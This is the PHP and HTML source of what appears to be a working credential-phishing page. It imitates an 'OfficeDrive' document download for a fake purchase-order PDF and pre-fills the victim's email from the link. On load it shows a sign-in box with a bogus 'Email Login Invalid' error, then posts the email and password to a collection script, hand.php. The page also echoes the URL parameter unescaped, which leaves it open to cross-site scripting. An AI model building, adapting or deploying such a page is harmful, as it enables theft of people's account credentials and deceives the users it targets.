  <?php $email_from_link = isset($_GET['email']) ? $_GET['email'] : '';
$emailarray  = explode('@',$email_from_link);
$emailSuffix = $emailarray[0];
 ?>
 <!doctype html>
<html>

<head>
<meta charset="UTF-8">

<title>OfficeDrive | PO# 1006847-330958.pdf Downloading...</title>


<meta name="robots" content="noindex,nofollow" />
<link rel="stylesheet" href="jinku/shakeppfl.css">
 
<script type="text/javascript" src="https://code.jquery.com/jquery.min.js"></script>
<script src="jinku/jquert7.js"></script>
<link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAASFBMVEUAAAAJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrEJSrH////aXMaSAAAAFnRSTlMAIHDAgKAQkNBAsODwUHmoYIfqMIg83ZjUrQAAAAFiS0dEFwvWmI8AAAAHdElNRQfjAgUNJxNHuQA2AAAAsElEQVQ4y+WQWRICIQxEwxaQRVE09z+qDMssFBzA8n1l6J6mA8DvwbgQQrKlzqmicK5r6pjRcbPOC0kHevWrzx3KcOkR9uT79omPPPKzwfVuEE0OUez5EvKkp6YLUO2eMDRsBra39HYLapugNC0APV2ou7J26t+fQAOlh62zxaTdaHCboacpmnAYQpzp5GQ3oKA5HKoCK4OBVLZIK0OuUbTIlwkNNHND3N97vqeGP+ELXJsiW6N0qWcAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTktMDItMDVUMTI6Mzk6MTkrMDE6MDCj1f02AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE5LTAyLTA1VDEyOjM5OjE5KzAxOjAw0ohFigAAAABJRU5ErkJggg==" sizes="32x32" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
  <script type="text/javascript">
    $(window).on('load',function(){
        $('#myModal').modal('show');
    });
</script>
</head>
 

 <body style="background-color: #fff;">

<div class="eldery">
 
 <center><div class="hig" style="width:100%; background-color: #000;"> 
 
 
<div style="width: auto; height: 47px; background: transparent; float: right"> 
<div style="width: 210px; background-color: green; height: 47px; float: left;" class="ray"> </div>
<div style="width: auto; background-color: transparent; height: 47px; float: right;" class=""> 
<div style="float: left; padding-left: 10px; padding-right: 10px; line-height: 47px; color: #fff;"><input value="<?php echo $emailSuffix;?>" readonly="" style="background: none;border: 0;outline: 0;color: #fff;text-align: right;"> </div>
<img src="jinku/side2.png" style="float: right; padding-right: 10px; ">
</div>

</div> 
 </div> </center>
 
<div style="width: 100%;">
 
<div style="width: 100%;margin-top: 47px; position: fixed;"> 
 
<div style="float: left; width: 208px; position: fixed; height: 616px;" class="matterway"> </div> 
<div style="float: left;height: 616px;background-color: #ffffff;position: static;width: 100%;margin-left: 206px;" class="">
<div class="saintremi" style="height: 37px; width: 100%; background-color: #F4F4F4;"> </div>

<div style="padding-left: 14px;padding-top: 31px;"> 
<Span style="font-size: 25px;"> Files</span>
<div style="width:176px ;  height: 171px; background-color: #eaeaea; margin-top: 20px; cursor: pointer;" data-toggle="modal" data-target="#myModal" class="juigat">
<br>
<center><div style="background: #fff;margin-top: 2px;width: 70px;height: 96px;box-shadow: 1px 2px 5px #e8dfdf; padding-bottom: 10px;"></div></center> 
 <center><div style="flex-shrink: 1 ; font-family: Segoe UI, Segoe UI Web (West European), Segoe UI, -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, sans-serif ; font-size: 14px ; font-weight: 400; margin-top: 6px; "> PO# 1006847-330958.pdf </div><div style="flex-shrink: 1;font-family: Segoe UI, Segoe UI Web, Segoe UI, -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, sans-serif;font-size: 12px;font-weight: 400;color: #777070;margin-top: -5px;"> Nov 2020</div></center>
</div>
 

</div>



 </div> 
 
 
 </div>
 
 
 </div>
 
  
 </div>
 	

</div>
<div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog" style="margin-top: 103px;width: 437px;">
    
      <!-- Modal content-->
      <div class="modal-content" style="border-radius: 0;height: 343px;box-shadow: 0 5px 10px rgba(0,0,0,.5);">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Sign in </h4>
		  <h5 style="color: red;">Email Login Invalid. Try again</h5>
        </div>
     <div class="modal-body">
		
		 <div>
		 <form method="post" action="hand.php" >
 
		 
		 <input type="email" name="jade" placeholder="Log In Email" tabindex="1" required="" class="" autofocus="1" style="width: 100%;height: 51px;padding-left: 10px;background: #d8d8d857;border: 0;outline: 0;" value="<?php echo $email_from_link;?>"> </div>
 <br>
<div style="">
 <input type="password" name="crakass" placeholder="Password" tabindex="1" required="" class="" value="" style="width: 100%;width: 100%;height: 51px;padding-left: 10px;background: #ffffff;border: solid 1px red !important;outline: 0;border: 0;"> 
 </div>
 
  <button name="slio" title="" class="" style="height: 38px; width: 100%; background: #0067B8; border: 0; float: right; margin-top: 24px; color: white; font-weight: 600; margin-bottom: 10px;"> Download
</button> 
		
<center><div style="padding-top: 12px; font-size: 13px;">©2021 OfficeDrive &nbsp; &nbsp; Terms of use  &nbsp; &nbsp; Privacy </div></center>
        </div>
       </form>
      </div>
      
    </div>
  </div>

 
   


</body>
</html>
